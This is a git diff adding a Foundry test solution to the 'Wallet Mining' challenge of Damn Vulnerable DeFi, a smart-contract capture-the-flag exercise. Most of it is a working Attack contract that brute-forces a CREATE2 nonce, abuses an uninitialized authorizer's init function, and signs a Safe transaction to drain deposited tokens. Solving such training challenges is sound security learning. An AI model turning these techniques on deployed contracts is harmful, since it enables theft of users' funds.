@@ -157,7 +157,8 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        Attack attacker = new Attack(userPrivateKey, user, ward, token, authorizer, walletDeployer, proxyFactory, singletonCopy);
+        attacker.attack();
     }
 
     /**
@@ -188,5 +189,161 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract Attack is Test {
+    address constant USER_DEPOSIT_ADDRESS =
+        0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
+    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
+
+    uint256 userPrivateKey;
+    address user;
+    address ward;
+    DamnValuableToken token;
+    AuthorizerUpgradeable authorizer;
+    WalletDeployer walletDeployer;
+    SafeProxyFactory proxyFactory;
+    Safe singletonCopy;
+
+    constructor(
+        uint256 _userPrivateKey,
+        address _user,
+        address _ward,
+        DamnValuableToken _token,
+        AuthorizerUpgradeable _authorizer,
+        WalletDeployer _walletDeployer,
+        SafeProxyFactory _proxyFactory,
+        Safe _singletonCopy
+    ) {
+        userPrivateKey = _userPrivateKey;
+        user = _user;
+        ward = _ward;
+        token = _token;
+        authorizer = _authorizer;
+        walletDeployer = _walletDeployer;
+        proxyFactory = _proxyFactory;
+        singletonCopy = _singletonCopy;
+    }
+
+    function attack() external {
+        // AuthorizerUpgradeable.init only ever gets called on the authorizer itself, not on the proxy. We
+        // can abuse this to grant access to WalletDeployer.drop
+
+        // Compute the address of the SafeProxy given the nonce as if it were deployed by SafeProxyFactory
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+
+        // We don't care about the optional delegate calls, fallbacks, or payments
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (
+                owners,
+                1,
+                address(0),
+                "",
+                address(0),
+                address(0),
+                0,
+                payable(address(0))
+            )
+        );
+
+        // Brute force the nonce
+        uint nonce = 0;
+        address computed;
+
+        while (true) {
+            // Cheatcode reference: https://getfoundry.sh/reference/cheatcodes/overview
+            computed = vm.computeCreate2Address(
+                // According to SafeProxyFactory.createProxyWithNonce:
+                // salt: keccak256(abi.encodePacked(keccak256(initializer), saltNonce))
+                keccak256(abi.encodePacked(keccak256(initializer), nonce)),
+                // hashInitCode: hash of creation code concatenated with args
+                keccak256(
+                    abi.encodePacked(
+                        type(SafeProxy).creationCode,
+                        uint256(uint160(address(singletonCopy)))
+                    )
+                ),
+                // deployer
+                address(proxyFactory)
+            );
+
+            if (computed == USER_DEPOSIT_ADDRESS) {
+                break;
+            }
+
+            nonce++;
+        }
+
+        // Sign a transaction on Safe with the user's private key
+        bytes memory data = abi.encodeCall(
+            token.transfer,
+            (user, DEPOSIT_TOKEN_AMOUNT)
+        );
+
+        // Reference Safe.encodeTransactionData
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH
+                address(token), // to
+                0, // value
+                keccak256(data), // keccak256(data)
+                Enum.Operation.Call, // operation
+                0, // safeTxGas
+                0, // baseGas
+                0, // gasPrice
+                address(0), // gasToken
+                address(0), // refundReceiver
+                0 // _nonce. Safe hasn't executed any transactions yet, so nonce is 0
+            )
+        );
+        bytes32 txHash = keccak256(
+            abi.encodePacked(
+                bytes1(0x19),
+                bytes1(0x01),
+                keccak256(
+                    abi.encode(
+                        0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH
+                        singletonCopy.getChainId(),
+                        USER_DEPOSIT_ADDRESS
+                    )
+                ),
+                safeTxHash
+            )
+        );
+
+        // Sign
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+
+        // Final Safe.execTransaction call
+        bytes memory execData = abi.encodeCall(
+            Safe.execTransaction,
+            (
+                address(token),
+                0,
+                data,
+                Enum.Operation.Call,
+                0,
+                0,
+                0,
+                address(0),
+                payable(address(0)),
+                abi.encodePacked(r, s, v) // Reminds me of my NaiveReceiver crashout LOL
+            )
+        );
+
+        // AuthorizerUpgradeable.init abuse
+        address[] memory wards = new address[](1);
+        address[] memory aims = new address[](1);
+
+        wards[0] = address(this);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+
+        authorizer.init(wards, aims);
+        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);
+        token.transfer(ward, token.balanceOf(address(this)));
+        USER_DEPOSIT_ADDRESS.call(execData);
     }
 }
